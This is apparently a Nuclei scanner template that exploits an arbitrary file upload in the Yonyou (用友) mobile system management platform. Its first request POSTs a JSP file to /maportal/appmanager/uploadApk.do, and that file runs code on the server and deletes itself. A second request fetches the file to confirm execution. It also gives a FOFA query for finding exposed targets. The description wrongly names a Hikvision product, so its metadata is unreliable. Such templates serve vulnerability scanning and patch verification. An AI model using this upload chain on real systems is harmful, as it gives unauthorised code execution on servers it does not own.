id: yonyou-mobile-uploadApk-fileupload

info:
  name: 用友移动系统管理平台 uploadApk.do - fileupload
  author: leadlife
  severity: critical
  description: An arbitrary file upload vulnerability in the Hikvision iSecureCenter.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/b3ef910d88ca6b25a69d02a4ab185b1549ed2169/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20uploadApk.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: false
    fofa-query: app="用友-移动系统管理"
  tags: yonyou,mobile,fileupload,oa

variables:
  filename: "{{to_lower(rand_text_alpha(8))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /maportal/appmanager/uploadApk.do?pk_obj=0001A1100000000H66QB HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Content-Type: multipart/form-data; boundary=-----{{boundary}}

        -------{{boundary}}
        Content-Disposition: form-data; name="downloadpath"; filename="{{filename}}.jsp"
        Content-Type: application/msword

        <%
        {out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();}
        %>
        -------{{boundary}}--

      - |
        GET /maupload/apk/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
        

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"12321")'
